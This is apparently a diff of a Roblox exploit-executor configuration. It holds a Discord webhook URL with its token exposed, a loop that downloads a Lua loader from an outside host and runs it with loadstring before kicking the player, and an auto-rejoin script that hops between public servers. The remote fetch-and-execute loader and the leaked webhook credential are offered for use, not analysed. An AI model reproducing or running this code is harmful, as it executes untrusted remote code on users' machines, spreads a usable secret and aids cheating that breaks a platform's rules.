@@ -1,5 +1,27 @@
-webhook:
+-------webhook:
+
 https://discord.com/api/webhooks/1249262772789710858/T9QhECTAkZGBL9kXDHv0esG6ih6aVjT5knSsBluMKDszbO7pBwFkdbDZy9bXr-6s8lrB
 
-script:
-repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(20)until Joebiden
+------SCRIPT:
+
+repeat wait()
+spawn(function()
+loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
+end)
+wait(60)
+game.Players.LocalPlayer:Kick()
+until Joebiden
+
+-----AutoRJ
+local po,ts = game:WaitForChild("CoreGui"):WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay"),game:GetService('TeleportService')
+po.ChildAdded:connect(function(a)
+if a.Name == 'ErrorPrompt' then
+
+while task.wait(5) do pcall(function()
+for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
+if type(v) == "table" and v.id ~= game.JobId then
+game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v.id)
+end end end) end
+
+end
+end)
